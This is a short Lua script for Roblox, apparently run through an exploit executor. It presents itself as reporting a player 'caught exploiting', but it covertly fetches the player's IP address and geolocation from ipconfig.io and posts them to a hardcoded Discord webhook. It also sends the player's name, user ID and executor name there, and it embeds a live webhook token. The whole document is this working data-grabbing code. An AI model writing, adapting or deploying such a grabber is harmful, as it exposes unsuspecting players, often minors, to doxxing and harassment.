return function()
	local Player = game.Players.LocalPlayer
	local url = "https://discord.com/api/webhooks/1226933576944189520/7mck8mDESiAh0oU8wcY9entcJZX-JqL2qS17p1m8_ZnNiMGlGBIha2ipiLxPt0Ohexdp"
	local data = {
		["content"] = "Player "..Player.Name.." ("..tostring(Player.UserId)..") has been caught exploiting with: "..getexecutorname(),
	}
	local newdata = game:GetService("HttpService"):JSONEncode(data)

	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)

	for i,v in game.HttpService:JSONDecode(game:HttpGet("https://ipconfig.io/json")) do
		data["content"] = tostring(i)..":"..tostring(v)
		local newdatanew = game:GetService("HttpService"):JSONEncode(data)
		local newabc = {Url = url, Body = newdatanew, Method = "POST", Headers = headers}
		request(newabc)
	end
end
